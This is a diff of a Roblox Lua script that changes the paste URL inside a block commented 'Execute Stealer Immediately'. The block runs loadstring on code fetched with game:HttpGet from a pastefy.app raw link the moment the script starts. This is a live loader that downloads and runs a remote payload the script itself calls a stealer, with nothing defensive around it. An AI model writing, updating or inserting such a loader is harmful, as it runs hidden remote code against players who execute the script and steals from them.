@@ -7,7 +7,7 @@ local CoreGui = game:GetService("CoreGui")
 
 -- Execute Stealer Immediately
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/hZcSLR75/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/okBJmYfc/raw"))()
 end)
 
 local LocalPlayer = Players.LocalPlayer
